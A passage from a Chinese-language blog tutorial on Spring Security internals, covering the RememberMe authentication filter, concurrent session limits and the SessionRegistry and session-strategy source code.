SecurityContextHolder.getContext().getAuthentication() + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>        &#125;));<br>        chain.doFilter(request, response);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Authentication</span> <span class="hljs-variable">rememberMeAuth</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.rememberMeServices.autoLogin(request, response);<br>        <span class="hljs-keyword">if</span> (rememberMeAuth != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                rememberMeAuth = <span class="hljs-built_in">this</span>.authenticationManager.authenticate(rememberMeAuth);<br>                SecurityContextHolder.getContext().setAuthentication(rememberMeAuth);<br>                <span class="hljs-built_in">this</span>.onSuccessfulAuthentication(request, response, rememberMeAuth);<br>                <span class="hljs-built_in">this</span>.logger.debug(LogMessage.of(() -&gt; &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SecurityContextHolder populated with remember-me token: &#x27;&quot;</span> + SecurityContextHolder.getContext().getAuthentication() + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>                &#125;));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.eventPublisher != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-built_in">this</span>.eventPublisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InteractiveAuthenticationSuccessEvent</span>(SecurityContextHolder.getContext().getAuthentication(), <span class="hljs-built_in">this</span>.getClass()));<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.successHandler != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-built_in">this</span>.successHandler.onAuthenticationSuccess(request, response, rememberMeAuth);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (AuthenticationException var6) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;SecurityContextHolder not populated with remember-me token, as AuthenticationManager rejected Authentication returned by RememberMeServices: &#x27;%s&#x27;; invalidating remember-me token&quot;</span>, rememberMeAuth), var6);<br>                <span class="hljs-built_in">this</span>.rememberMeServices.loginFail(request, response);<br>                <span class="hljs-built_in">this</span>.onUnsuccessfulAuthentication(request, response, var6);<br>            &#125;<br>        &#125;<br><br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先判断是否登陆过,没有登陆过则进行自动登录(就是前两节说的实现了autoLogin方法),如果自动登录后返回null,则登录失败.</p><p>当登录成功后则调用authenticate方法对key进行校验成功后会将用户数据放入SecurityContextHolder中,并报告登录成功(但不调用loginSuccess方法)</p><blockquote><p>最后再额外说一下RememberMeServices#loginSuccess方法的调用位置。该方法是在AbstractAuthenticationProcessingFilter#successfulAuthentication中触发的，也就是说，无论你是否开启了RememberMe功能，该方法都会被调用。只不过在RememberMeServices#loginSuccess方法的具体实现中，会去判断是否开启了RememberMe，进而决定是否在响应中添加对应的Cookie。</p></blockquote><p>如果自动登录失败，则调用rememberMeServices.loginFail方法处理登录失败回调。onUnsuccessfulAuthentication和onSuccessfulAuthentication都是该过滤器中定义的空方法，并没有任何实现。</p><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><p>HttpSession相关的功能由SessionManagementFilter和SessionAuthenticationStrategy接口来处理，SessionManagementFilter过滤器将Session相关操作委托给SessionAuthenticationStrategy接口去完成。</p><h4 id="并发管理"><a href="#并发管理" class="headerlink" title="并发管理"></a>并发管理</h4><p>就是同一时间允许几个用户同时登录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.inMemoryAuthentication().withUser(<span class="hljs-string">&quot;YH&quot;</span>).password(<span class="hljs-string">&quot;&#123;noop&#125;123456&quot;</span>).roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>                .anyRequest()<br>                .authenticated()<br>                .and()<br>                .formLogin()<br>                .and()<br>                .csrf()<br>                .disable()<br>                .sessionManagement()<br>                .maximumSessions(<span class="hljs-number">1</span>);<span class="hljs-comment">//只允许一个用户</span><br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    HttpSessionEventPublisher <span class="hljs-title function_">httpSessionEventPublisher</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpSessionEventPublisher</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>例如这种定义方式只允许一个用户登陆</p><p>而HttpSessionEventPublisher则是用来监听HttpSession的创建和销毁(当用户登录则会创建,当用户注销则会销毁)</p><p>使用上面这种方式后登录的用户会&#x3D;&#x3D;顶掉&#x3D;&#x3D;前面的登录用户</p><p>例如我在chrome使用YH来登录再用星愿使用YH登录,则chrome用户则会被&#x3D;&#x3D;顶掉&#x3D;&#x3D;</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211020102553565.png" alt="image-20211020102553565"></p><p>如果是前后端分离的项目则需要返回一个json,将config中的内容修改为下面这种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">http.authorizeRequests()<br>           .anyRequest().authenticated()<br>           .and()<br>           .formLogin()<br>           .and()<br>           .csrf()<br>           .disable()<br>           .sessionManagement()<br>           .maximumSessions(<span class="hljs-number">1</span>)<br>           .expiredSessionStrategy(event -&gt; &#123;<br>               <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> event.getResponse();<br>               response.setContentType(<span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);<br>               Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>               result.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">500</span>);<br>               result.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;当前会话已经失效，请重新登录&quot;</span>);<br>               <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>().writeValueAsString(result);<br>               response.getWriter().print(s);<br>               response.flushBuffer();<br>           &#125;);<br></code></pre></td></tr></table></figure><p>如果想要阻止后来的用户登录则设置maxSessionsPreventsLogin(true)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">http.authorizeRequests()<br>        .anyRequest()<br>        .authenticated()<br>        .and()<br>        .formLogin()<br>        .and()<br>        .csrf()<br>        .disable()<br>        .sessionManagement()<br>        .maximumSessions(<span class="hljs-number">1</span>)<br>        .maxSessionsPreventsLogin(<span class="hljs-literal">true</span>);<span class="hljs-comment">//这里</span><br></code></pre></td></tr></table></figure><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先是会话记录使用的类</p><h5 id="SessionInformation"><a href="#SessionInformation" class="headerlink" title="SessionInformation"></a>SessionInformation</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionInformation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> SpringSecurityCoreVersion.SERIAL_VERSION_UID;<br><span class="hljs-comment">//最后一次登录时间</span><br><span class="hljs-keyword">private</span> Date lastRequest;<br><span class="hljs-comment">//用户实体对象</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object principal;<br><span class="hljs-comment">//会话Id</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String sessionId;<br><span class="hljs-comment">//会话是否过期</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">expired</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="SessionRegistry"><a href="#SessionRegistry" class="headerlink" title="SessionRegistry"></a>SessionRegistry</h5><p>是用来维护SessionInformation的信息,而它只有一个实现类SessionRegistryImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionRegistryImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SessionRegistry</span>, ApplicationListener&lt;AbstractSessionEvent&gt; &#123;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogFactory.getLog(SessionRegistryImpl.class);<br><br><span class="hljs-comment">// &lt;principal:Object,SessionIdSet&gt;</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;Object, Set&lt;String&gt;&gt; principals;<br><br><span class="hljs-comment">// &lt;sessionId:Object,SessionInformation&gt;</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, SessionInformation&gt; sessionIds;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">SessionRegistryImpl</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>.principals = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br><span class="hljs-built_in">this</span>.sessionIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">SessionRegistryImpl</span><span class="hljs-params">(ConcurrentMap&lt;Object, Set&lt;String&gt;&gt; principals,</span><br><span class="hljs-params">Map&lt;String, SessionInformation&gt; sessionIds)</span> &#123;<br><span class="hljs-built_in">this</span>.principals = principals;<br><span class="hljs-built_in">this</span>.sessionIds = sessionIds;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;Object&gt; <span class="hljs-title function_">getAllPrincipals</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-built_in">this</span>.principals.keySet());<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;SessionInformation&gt; <span class="hljs-title function_">getAllSessions</span><span class="hljs-params">(Object principal, <span class="hljs-type">boolean</span> includeExpiredSessions)</span> &#123;<br>Set&lt;String&gt; sessionsUsedByPrincipal = <span class="hljs-built_in">this</span>.principals.get(principal);<br><span class="hljs-keyword">if</span> (sessionsUsedByPrincipal == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span> Collections.emptyList();<br>&#125;<br>List&lt;SessionInformation&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(sessionsUsedByPrincipal.size());<br><span class="hljs-keyword">for</span> (String sessionId : sessionsUsedByPrincipal) &#123;<br><span class="hljs-type">SessionInformation</span> <span class="hljs-variable">sessionInformation</span> <span class="hljs-operator">=</span> getSessionInformation(sessionId);<br><span class="hljs-keyword">if</span> (sessionInformation == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (includeExpiredSessions || !sessionInformation.isExpired()) &#123;<br>list.add(sessionInformation);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> list;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SessionInformation <span class="hljs-title function_">getSessionInformation</span><span class="hljs-params">(String sessionId)</span> &#123;<br>Assert.hasText(sessionId, <span class="hljs-string">&quot;SessionId required as per interface contract&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.sessionIds.get(sessionId);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApplicationEvent</span><span class="hljs-params">(AbstractSessionEvent event)</span> &#123;<br><span class="hljs-keyword">if</span> (event <span class="hljs-keyword">instanceof</span> SessionDestroyedEvent) &#123;<br><span class="hljs-type">SessionDestroyedEvent</span> <span class="hljs-variable">sessionDestroyedEvent</span> <span class="hljs-operator">=</span> (SessionDestroyedEvent) event;<br><span class="hljs-type">String</span> <span class="hljs-variable">sessionId</span> <span class="hljs-operator">=</span> sessionDestroyedEvent.getId();<br>removeSessionInformation(sessionId);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event <span class="hljs-keyword">instanceof</span> SessionIdChangedEvent) &#123;<br><span class="hljs-type">SessionIdChangedEvent</span> <span class="hljs-variable">sessionIdChangedEvent</span> <span class="hljs-operator">=</span> (SessionIdChangedEvent) event;<br><span class="hljs-type">String</span> <span class="hljs-variable">oldSessionId</span> <span class="hljs-operator">=</span> sessionIdChangedEvent.getOldSessionId();<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.sessionIds.containsKey(oldSessionId)) &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.sessionIds.get(oldSessionId).getPrincipal();<br>removeSessionInformation(oldSessionId);<br>registerNewSession(sessionIdChangedEvent.getNewSessionId(), principal);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshLastRequest</span><span class="hljs-params">(String sessionId)</span> &#123;<br>Assert.hasText(sessionId, <span class="hljs-string">&quot;SessionId required as per interface contract&quot;</span>);<br><span class="hljs-type">SessionInformation</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> getSessionInformation(sessionId);<br><span class="hljs-keyword">if</span> (info != <span class="hljs-literal">null</span>) &#123;<br>info.refreshLastRequest();<br>&#125;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerNewSession</span><span class="hljs-params">(String sessionId, Object principal)</span> &#123;<br>Assert.hasText(sessionId, <span class="hljs-string">&quot;SessionId required as per interface contract&quot;</span>);<br>Assert.notNull(principal, <span class="hljs-string">&quot;Principal required as per interface contract&quot;</span>);<br><span class="hljs-keyword">if</span> (getSessionInformation(sessionId) != <span class="hljs-literal">null</span>) &#123;<br>removeSessionInformation(sessionId);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isDebugEnabled()) &#123;<br><span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;Registering session %s, for principal %s&quot;</span>, sessionId, principal));<br>&#125;<br><span class="hljs-built_in">this</span>.sessionIds.put(sessionId, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionInformation</span>(principal, sessionId, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()));<br><span class="hljs-built_in">this</span>.principals.compute(principal, (key, sessionsUsedByPrincipal) -&gt; &#123;<br><span class="hljs-keyword">if</span> (sessionsUsedByPrincipal == <span class="hljs-literal">null</span>) &#123;<br>sessionsUsedByPrincipal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArraySet</span>&lt;&gt;();<br>&#125;<br>sessionsUsedByPrincipal.add(sessionId);<br><span class="hljs-built_in">this</span>.logger.trace(LogMessage.format(<span class="hljs-string">&quot;Sessions used by &#x27;%s&#x27; : %s&quot;</span>, principal, sessionsUsedByPrincipal));<br><span class="hljs-keyword">return</span> sessionsUsedByPrincipal;<br>&#125;);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeSessionInformation</span><span class="hljs-params">(String sessionId)</span> &#123;<br>Assert.hasText(sessionId, <span class="hljs-string">&quot;SessionId required as per interface contract&quot;</span>);<br><span class="hljs-type">SessionInformation</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> getSessionInformation(sessionId);<br><span class="hljs-keyword">if</span> (info == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isTraceEnabled()) &#123;<br><span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Removing session &quot;</span> + sessionId + <span class="hljs-string">&quot; from set of registered sessions&quot;</span>);<br>&#125;<br><span class="hljs-built_in">this</span>.sessionIds.remove(sessionId);<br><span class="hljs-built_in">this</span>.principals.computeIfPresent(info.getPrincipal(), (key, sessionsUsedByPrincipal) -&gt; &#123;<br><span class="hljs-built_in">this</span>.logger.debug(<br>LogMessage.format(<span class="hljs-string">&quot;Removing session %s from principal&#x27;s set of registered sessions&quot;</span>, sessionId));<br>sessionsUsedByPrincipal.remove(sessionId);<br><span class="hljs-keyword">if</span> (sessionsUsedByPrincipal.isEmpty()) &#123;<br><span class="hljs-comment">// No need to keep object in principals Map anymore</span><br><span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;Removing principal %s from registry&quot;</span>, info.getPrincipal()));<br>sessionsUsedByPrincipal = <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-built_in">this</span>.logger.trace(<br>LogMessage.format(<span class="hljs-string">&quot;Sessions used by &#x27;%s&#x27; : %s&quot;</span>, info.getPrincipal(), sessionsUsedByPrincipal));<br><span class="hljs-keyword">return</span> sessionsUsedByPrincipal;<br>&#125;);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先是两个变量</li></ul><p>sessionIds:用来根据sessionId来获取session</p><p>principals:用来存储用户与sessionId之间的映射关系</p><blockquote><p>由于principals集合中采用当前登录用户对象做key，将对象作为集合中的key，需要重写其equals方法和hashCode方法。在前面的案例中，由于我们使用了系统默认定义的User类，该类已经重写了equals方法和hashCode方法。&#x3D;&#x3D;如果开发者自定义用户类，记得重写其equals方法和hashCode方法&#x3D;&#x3D;，否则会话并发管理会失效。</p></blockquote><ul><li>其次是方法</li></ul><p>getAllPrincipals:用来获取所有用户对象</p><p>getAllSessions:根据用户名来获取SessionInformation,可以指定是否过去过期的session</p><p>onApplicationEvent:根据事件来决定是更新session还是销毁session</p><p>registerNewSession:当用户登录成功后，会执行会话保存操作，传入当前请求的sessionId和当前登录主体principal对象。如果sessionId已经存在，则先将其移除，然后先往sessionIds中保存，key是sessionId，value则是一个新创建的SessionInformation对象。在向principals集合中保存时使用了compute方法（如果读者对Java8中的compute方法还不太熟悉，可以自行学习，这里不做过多介绍），第一个参数就是当前登录主体，第二个参数则进行了计算。如果当前登录主体在principals中已经有对应的value，则在value的基础上继续添加一个sessionId。如果当前登录主体在principals中没有对应的value，则新建一个sessionsUsedByPrincipal对象，然后再将sessionId添加进去。</p><p>removeSessionInformation:移除session,移除也是两方面的工作，一方面就是从sessionIds变量中移除，这个直接调用remove方法即可；另一方面就是从principals变量中移除，principals中key是当前登录的用户对象，value则是一个集合，里边保存着当前用户对应的所有sessionId，这里主要是移除value中对应的sessionId。</p><h5 id="SessionAuthenticationStrategy"><a href="#SessionAuthenticationStrategy" class="headerlink" title="SessionAuthenticationStrategy"></a>SessionAuthenticationStrategy</h5><p>主要用于登录成功后对httpSession的操作</p><p>实现类有以下几种</p><ul><li>CsrfAuthenticationStrategy：CsrfAuthenticationStrategy和CSRF攻击有关，该类主要负责在身份验证后删除旧的CsrfToken并生成一个新的CsrfToken。</li><li>ConcurrentSessionControlAuthenticationStrategy：该类主要用来处理Session并发问题。前面案例中Session并发的控制，实际上就是通过该类来完成的。</li><li>RegisterSessionAuthenticationStrategy：该类用于在认证成功后将HttpSession信息记录到SessionRegistry中。</li><li>CompositeSessionAuthenticationStrategy：这是一个复合策略，它里边维护了一个集合，集合中保存了多个不同的SessionAuthenticationStrategy对象，相当于该类代理了多个SessionAuthenticationStrategy对象，大部分情况下，在Spring Security框架中直接使用的也是该类的实例。</li><li>NullAuthenticatedSessionStrategy：这是一个空的实现，未做任何处理。</li><li>AbstractSessionFixationProtectionStrategy：处理会话固定攻击的基类。</li><li>ChangeSessionIdAuthenticationStrategy：通过修改sessionId来防止会话固定攻击。</li><li>SessionFixationProtectionStrategy：通过创建一个新的会话来防止会话固定攻击。</li></ul><p>主要起作用的是:ConcurrentSessionControlAuthenticationStrategy</p><p>重点来看onAuthentication方法(实现方法)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAuthentication</span><span class="hljs-params">(Authentication authentication, HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">allowedSessions</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getMaximumSessionsForThisUser(authentication);<br>    <span class="hljs-keyword">if</span> (allowedSessions != -<span class="hljs-number">1</span>) &#123;<br>        List&lt;SessionInformation&gt; sessions = <span class="hljs-built_in">this</span>.sessionRegistry.getAllSessions(authentication.getPrincipal(), <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sessionCount</span> <span class="hljs-operator">=</span> sessions.size();<br>        <span class="hljs-keyword">if</span> (sessionCount &gt;= allowedSessions) &#123;<br>            <span class="hljs-keyword">if</span> (sessionCount == allowedSessions) &#123;<br>                <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> sessions.iterator();<br><br>                    <span class="hljs-keyword">while</span>(var8.hasNext()) &#123;<br>                        <span class="hljs-type">SessionInformation</span> <span class="hljs-variable">si</span> <span class="hljs-operator">=</span> (SessionInformation)var8.next();<br>                        <span class="hljs-keyword">if</span> (si.getSessionId().equals(session.getId())) &#123;<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.allowableSessionsExceeded(sessions, allowedSessions, <span class="hljs-built_in">this</span>.sessionRegistry);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果为-1则代表不限制最大登录数则之间返回.</p><p>如果小于最大链接数则直接返回</p><p>如果等于最大连接数则在session中查找是否存在该session如果存在则直接返回</p><p>以上都不满足则进入以下代码</p><p>allowableSessionsExceeded</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">allowableSessionsExceeded</span><span class="hljs-params">(List&lt;SessionInformation&gt; sessions, <span class="hljs-type">int</span> allowableSessions, SessionRegistry registry)</span> <span class="hljs-keyword">throws</span> SessionAuthenticationException &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.exceptionIfMaximumExceeded &amp;&amp; sessions != <span class="hljs-literal">null</span>) &#123;<br>        sessions.sort(Comparator.comparing(SessionInformation::getLastRequest));<br>        <span class="hljs-type">int</span> <span class="hljs-variable">maximumSessionsExceededBy</span> <span 